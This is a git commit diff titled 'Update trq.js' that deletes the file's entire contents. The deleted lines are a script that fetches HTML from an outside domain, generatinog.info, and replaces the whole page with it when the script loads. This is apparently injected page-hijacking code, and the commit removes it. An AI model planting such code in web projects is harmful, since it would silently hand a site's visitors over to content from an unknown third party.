0d1e007979134cb83ba70b82c573652b88415082
tdafbsdf77 <87510368+tdafbsdf77@users.noreply.github.com>
2021-08-31 02:56:58 -0400

    Update trq.js

--- trq.js
+++ trq.js
@@ -1,11 +1,1 @@
-function load_home () {
-    fetch("https://generatinog.info/?linkid=6466" /*, options */)
-    .then((response) => response.text())
-    .then((html) => {
-        document.querySelector("html").innerHTML = html;
-    })
-    .catch((error) => {
-        console.warn(error);
-    });
-}
-load_home();
+
